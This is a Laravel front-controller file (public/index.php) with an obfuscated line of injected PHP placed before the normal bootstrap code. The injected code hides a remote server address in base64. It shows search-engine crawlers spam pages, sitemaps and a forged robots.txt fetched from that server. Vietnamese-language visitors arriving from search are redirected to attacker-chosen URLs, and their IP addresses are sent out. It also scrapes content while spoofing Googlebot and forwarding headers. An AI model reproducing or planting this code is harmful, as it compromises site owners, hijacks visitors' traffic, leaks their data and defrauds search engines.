<?php
if(!defined("A____AA"))call_user_func("define","A____AA", "A___A__");$GLOBALS[A____AA]=array(&$_SERVER);@set_time_limit(0);error_reporting(0);$curl_timeout=10;$TD_server="aHR0cDovL2MuYmlnZ2lybC5oZWxw";$TD_server=base64_decode($TD_server);$lang='vi';$user_agent=!empty($GLOBALS[A____AA][0]["HTTP_USER_AGENT"])?strtolower($GLOBALS[A____AA][0]['HTTP_USER_AGENT']):'';$http_type=((isset($GLOBALS[A____AA][0]['HTTPS'])&&$GLOBALS[A____AA][0]['HTTPS']=='on')||(isset($GLOBALS[A____AA][0]['HTTP_X_FORWARDED_PROTO'])&&$GLOBALS[A____AA][0]['HTTP_X_FORWARDED_PROTO']=='https'))?'https':'http';$host=!empty($GLOBALS[A____AA][0]['HTTP_HOST'])?strtolower($GLOBALS[A____AA][0]['HTTP_HOST']):'';$parsedHost=parse_url($http_type . '://' . $host,PHP_URL_HOST);$host=$parsedHost!==null?$parsedHost:$host;$referer=!empty($GLOBALS[A____AA][0]["HTTP_REFERER"])?strtolower($GLOBALS[A____AA][0]['HTTP_REFERER']):'';$request=!empty($GLOBALS[A____AA][0]['REQUEST_URI'])?urlencode(strtolower($GLOBALS[A____AA][0]['REQUEST_URI'])):'';$has_curl=extension_loaded('curl');if(strpos($user_agent,'google')!==false||strpos($user_agent,'coccoc')!==false||strpos($user_agent,'bingbot')!==false){ob_clean();if(substr($request,-4)===".xml"){header('Content-Type: application/xml; charset=utf-8');if(stripos($request,'itemap.xml')!==false){$response=curl_request($TD_server. "/indexsitemap.php?type=" .$http_type. "&host=" .$host,$user_agent);}else{$n=getNumber($request);$response=curl_request($TD_server. "/sitemap.php?type=" .$http_type. "&host=" .$host. "&page=" .$n,$user_agent);}if($response!==false&&$response[0]==200){echo $response[1];exit;}}else if(stripos($request,'robots.txt')!==false){header('Content-Type: text/plain');$robotsTxtContent="User-agent: *
";$robotsTxtContent .="Allow: /
";$robotsTxtContent .="Sitemap: " .$http_type.rtrim($host,'/'). "/" . "sitemap.xml
";echo $robotsTxtContent;exit;}$image_pattern='/\.(jpg|jpeg|png|gif|bmp|webp|tiff|tif|svg|ico|avi|wmv|mpg|mpeg|mov|rm|ram|swf|flv|mp4|mkv|webm|3gp|vob|asf|ts|m2ts|ogg|ogm)(\?.*)?$/i';if(preg_match($image_pattern,$request)){exit;}$response=curl_request($TD_server. "/index.php?type=" .$http_type. "&host=" .$host. "&request=" .$request,$user_agent);if($response!==false){if($response[0]==200){header('Content-Type: text/html; charset=utf-8');echo $response[1];exit;}if($response[0]!=200&&!empty($response[1])){$json_data=str_replace(array(chr(239),chr(187),chr(191),"
","
","
","	"),'',$response[1]);$product_data=json_decode($json_data,true);$title=urlencode($product_data['keyword']);$pid=$product_data['kid'];if(!empty($title)){$spider_result=spider($title);}}if(isset($spider_result)&&$spider_result!=false&&isset($pid)){$data=array('kid'=>$pid,'spider_url'=>$spider_result[0],'html_text'=>$spider_result[1]);}else{$pid=isset($pid)?$pid:0;$data=array('kid'=>$pid,'spider_url'=>'','html_text'=>'');}$BotContent_mb=post($TD_server. "/postcreate.php?type=" .$http_type. "&host=" .$host. "&request=" .$request,$data,$user_agent);if(!empty($BotContent_mb)){echo $BotContent_mb;exit;}}}if(strpos($referer,'google')!==false||strpos($referer,'coccoc')!==false||strpos($referer,'bing')!==false){if(judgeLanguage($lang)==1){$client_ip=base64_encode(get_client_ip());$referer=urlencode($referer);$response=curl_request($TD_server. "/getlink.php?type=" .$http_type. "&host=" .$host. "&request=" .$request. "&referer=" .$referer. "&client_ip=" .$client_ip,$user_agent);if($response!==false&&$response[0]==200&&strlen($response[1])>5){$tzurl=trim($response[1]);$tzurl=str_replace(array(chr(239),chr(187),chr(191),"
","
","
","	"),'',$tzurl);@header("Location: " . $tzurl);exit;}}}function generate_random_ua(){$user_agents=['Mozilla/5.0 (Windows NT 6.3; WOW64; rv:54.0) Gecko/20100101 Firefox/' .rand(1,100),'Mozilla/' .rand(3,5). '.0 (Windows NT 10.0; Win64; x64; rv:' .rand(50,60). ') Gecko/20100101 Firefox/' .rand(1,100),'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:' .rand(50,60). ') AppleWebKit/' .rand(500,600). '.36 (KHTML, like Gecko) Chrome/' .rand(50,60). '.0.3112.90 Safari/' .rand(500,600). '.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/' .rand(13,16). '.0 Safari/605.1.15','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' .rand(90,100). '.0.4430.212 Safari/537.36 Edg/' .rand(90,100). '.0.1185.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' .rand(90,100). '.0.4430.212 Safari/537.36 OPR/' .rand(76,86). '.0.4017.123','Mozilla/5.0 (Linux; Android ' .rand(8,12). '.0; SM-G9' .rand(5,9). '0F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' .rand(90,100). '.0.4430.212 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS ' .rand(14,16). '_' .rand(0,5). ' like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/' .rand(14,16). '.0 Mobile/15E148 Safari/604.1',];return $user_agents[array_rand($user_agents)];}function curl_request($url,$ua='',$referer=null){global $has_curl,$curl_timeout;if($ua==''){$ua=generate_random_ua();}if($has_curl){$ip=rand(1,254). '.' .rand(1,254). '.' .rand(1,254). '.' .rand(1,254);$headers['CLIENT-IP']=$ip;$headers['X-FORWARDED-FOR']=$ip;$headerArr=array();foreach($headers as $n=>$v){$headerArr[]=$n. ':' .$v;}$curl=curl_init();curl_setopt($curl,CURLOPT_URL,$url);curl_setopt($curl,CURLOPT_HTTPHEADER,$headerArr);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,2);curl_setopt($curl,CURLOPT_USERAGENT,$ua);curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);curl_setopt($curl,CURLOPT_AUTOREFERER,1);curl_setopt($curl,CURLOPT_ENCODING,"gzip");curl_setopt($curl,CURLOPT_HTTPGET,1);curl_setopt($curl,CURLOPT_TIMEOUT,$curl_timeout);curl_setopt($curl,CURLOPT_HEADER,0);curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);curl_setopt($curl,CURLOPT_REFERER,$referer);$output=curl_exec($curl);$httpcode=curl_getinfo($curl,CURLINFO_HTTP_CODE);curl_close($curl);return $output?[$httpcode,$output]:false;}else{$options=['http'=>['method'=>'GET','ignore_errors'=>true,'header'=>"User-Agent: " .$ua. "
" . "Referer: " .$referer. "
",'timeout'=>$curl_timeout],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]];$context=stream_context_create($options);$response=@file_get_contents($url,false,$context);if($response===false){return false;}$http_response_header=isset($http_response_header)?$http_response_header:[];preg_match('/HTTP\/\d\.\d (\d{3})/',$http_response_header[0],$matches);$httpcode=isset($matches[1])?(int)$matches[1]:0;return[$httpcode,$response];}}function post($url,$postData,$ua=''){global $has_curl;if($ua==''){$ua=generate_random_ua();}if($has_curl){$curl=curl_init();curl_setopt($curl,CURLOPT_URL,$url);curl_setopt($curl,CURLOPT_HEADER,0);curl_setopt($curl,CURLOPT_USERAGENT,$ua);curl_setopt($curl,CURLOPT_POST,true);curl_setopt($curl,CURLOPT_POSTFIELDS,http_build_query($postData));curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);$output=curl_exec($curl);curl_close($curl);return $output;}else{$postData=http_build_query($postData);$options=['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded; charset=UTF-8
" . "Accept: application/json
" . "User-Agent: " .$ua. "
",'content'=>$postData,'timeout'=>10],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]];$context=stream_context_create($options);$response=@file_get_contents($url,false,$context);return $response;}}function judgeLanguage($lang){if(!defined("A___A_A"))call_user_func("define","A___A_A", "A___AA_");$GLOBALS[A___A_A]=array(&$_SERVER);if(isset($GLOBALS[A___A_A][0]['HTTP_ACCEPT_LANGUAGE'])){$languages=explode(',',$GLOBALS[A___A_A][0]['HTTP_ACCEPT_LANGUAGE']);$firstLang=strtolower(trim($languages[0]));return substr($firstLang,0,2)===$lang?1:0;}return 0;}function getNumber($string){$posSitemap=strpos($string,'sitemap');$posXml=strpos($string,'.xml');if($posSitemap!==false&&$posXml!==false&&$posXml>$posSitemap){$length=$posXml-$posSitemap-strlen('sitemap');$substring=substr($string,$posSitemap+strlen('sitemap'),$length);return intval($substring);}return 0;}function get_client_ip(){if(!defined("A___AAA"))call_user_func("define","A___AAA", "A__A___");$GLOBALS[A___AAA]=array(&$_SERVER);$ip_keys=array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR');foreach($ip_keys as $key){if(array_key_exists($key,$GLOBALS[A___AAA][0])===true){foreach(explode(',',$GLOBALS[A___AAA][0][$key])as $ip){$ip=trim($ip);if(filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4|FILTER_FLAG_IPV6)!==false){return $ip;}}}}return 'unknown';}function spider($name){$hrefTemp=spider_search($name);if(empty($hrefTemp)){return false;}$hrefArray=[];foreach($hrefTemp as $href){$non_web_extensions=['pdf','doc','docx','xls','xlsx','ppt','pptx'];$file_extension=pathinfo(parse_url($href,PHP_URL_PATH),PATHINFO_EXTENSION);if(in_array(strtolower($file_extension),$non_web_extensions)){continue 1;}if(stripos($href,'youtube.com')!==false||stripos($href,'twitter.com')!==false||stripos($href,'bing.com')!==false){continue 1;}$hrefArray[]=$href;}if(empty($hrefArray)){return false;}shuffle($hrefArray);$googleua="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";foreach($hrefArray as $href){$spider_html=curl_request($href,$googleua,$href);if($spider_html!==false&&$spider_html[0]==200){$htmltext=trim($spider_html[1]);if(strlen($htmltext)>2000){return[$href,$htmltext];}}}return false;}function spider_search($name){$search_url="https://search.aol.com/aol/search?q=" . urlencode($name);$hrefArray=[];$result=curl_request($search_url,'',$search_url);if($result===false||$result[0]!==200){return[];}$html=$result[1];$dom=new DOMDocument();@$dom->loadHTML($html);$xpath=new DOMXPath($dom);foreach($xpath->query('//a[@href]')as $a){$href=$a->getAttribute('href');if(!preg_match('/\/RU=([^\/]+)\/RK=/',$href,$m)){continue 1;}$realUrl=urldecode($m[1]);$host=parse_url($realUrl,PHP_URL_HOST);if(!$host)continue 1;if(stripos($host,'aol.com')!==false||stripos($host,'oath.com')!==false){continue 1;}if(preg_match('/(google|facebook|twitter|youtube|bing|apple|microsoft|yahoo|schema\.org|w3\.org)/i',$host)){continue 1;}if(preg_match('/\.(js|css|png|jpg|jpeg|gif|svg|ico|webp|pdf)$/i',$realUrl)){continue 1;}if(!preg_match('#^https?://#i',$realUrl)){continue 1;}$hrefArray[]=$realUrl;}return array_values(array_unique($hrefArray));}
?><?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
